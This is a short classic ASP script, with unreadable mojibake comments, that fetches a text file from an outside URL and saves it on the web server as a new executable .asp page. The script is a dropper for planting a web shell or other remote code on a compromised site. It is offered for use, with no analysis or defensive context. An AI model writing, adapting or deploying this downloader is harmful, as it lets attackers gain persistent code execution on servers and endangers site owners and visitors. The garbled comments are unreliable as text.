'��˼�ǰ�http://www.baidu.com/2.txt����ļ����ص���ǰĿ¼����Ϊ11.asp
'������...����Ϊx.asp��Ȼ��ȥ����http://www.baidu.com/11.asp������
'���ߵ���Ҫ��֧���������ϴ��齨
<%
Set xPost = CreateObject("Microsoft.XMLHTTP")
xPost.Open "GET","http://www.baidu.com/2.txt",False
xPost.Send()
Set sGet = CreateObject("ADODB.Stream")
sGet.Mode = 3
sGet.Type = 1
sGet.Open()
sGet.Write(xPost.responseBody)
sGet.SaveToFile Server.MapPath("11.asp"),2
set sGet = nothing
set sPOST = nothing
%>